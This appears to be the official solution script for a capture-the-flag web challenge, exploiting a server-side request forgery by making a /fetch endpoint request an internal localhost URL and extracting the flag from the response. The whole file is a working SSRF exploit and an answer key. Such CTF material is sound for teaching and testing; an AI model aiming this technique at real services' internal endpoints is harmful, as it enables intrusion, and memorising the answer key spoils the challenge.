"""
Official solution for web-ssrf-01.
The /fetch endpoint makes server-side requests without validating the URL.
We pass http://localhost:8080/secret to make the server fetch its own internal API.
"""
import requests, re

TARGET = "http://localhost:5000"
r = requests.post(f"{TARGET}/fetch", data={"url": "http://localhost:8080/secret"})
flag = re.search(r"CTF\{[^}]+\}", r.text)
print(f"Flag: {flag.group()}" if flag else "Flag not found — check /fetch manually")
